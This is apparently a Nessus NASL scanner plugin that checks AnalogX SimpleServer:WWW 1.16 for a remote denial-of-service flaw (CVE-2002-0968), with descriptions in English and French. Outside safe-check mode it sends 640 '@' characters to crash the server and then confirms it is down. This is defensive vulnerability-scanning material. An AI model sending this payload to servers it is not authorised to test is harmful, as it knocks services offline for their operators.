#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence...
#
# Rerefence:
# To: bugtraq@securityfocus.com
# From:"Fort _" <fort@linuxmail.org>
# Subject: Remote DoS in AnalogX SimpleServer:www 1.16
# Message-ID: <20020613122121.31625.qmail@mail.securityfocus.com>
#

if(description)
{
 script_id(11035);
 script_bugtraq_id(5006);
 script_version("$Revision: 1.14 $");
 script_cve_id("CVE-2002-0968");
 script_name(english:"AnalogX SimpleServer:WWW  DoS");
 
 desc["english"] = "
It was possible to kill the remote web server by sending 640 @ 
character to it.

A cracker may use this flaw to make your server crash continuously, 
preventing it from working properly.

Solution : upgrade your software or use another
HTTP server.

Risk factor : High";

 desc["francais"] = "
Il a été possible de tuer le serveur web sitant en lui envoyant
640 caractères @

Un pirate peut exploiter cette faille problème pour tuer 
continuellement votre serveur, l'empêchant de fonctionner 
correctement.

Solution : mettez à jour votre logiciel ou 
utilisez un autre serveur HTTP.

Facteur de risque : Élevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes SimpleServer:WWW";
 summary["francais"] = "Tue SimpleServer:WWW";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/simpleserver");
 exit(0);
}

# The script code starts here

include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);

banner = get_http_banner(port: port);
if (! banner) exit(0);

if (safe_checks())
{
  if (egrep(pattern:"^Server: *SimpleServer:WWW/1.[01]([^0-9]|$)", string:banner))
  {
    security_hole(port: port, data:"According ot its version number, 
it should be possible to kill your remote SimpleServer web server 
by sending 640 @ character to it.

A cracker may use this flaw to make your server crash continuously, 
preventing it from working properly.

Solution : upgrade your software or use another
HTTP server.

Risk factor : High");
   }
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc) exit(0);

send(socket:soc, data:string(crap(length:640, data:"@"), "\r\n\r\n"));
r = http_recv(socket:soc);
close(soc);

soc = open_sock_tcp(port);
if(soc) { close(soc); exit(0); }

security_hole(port);
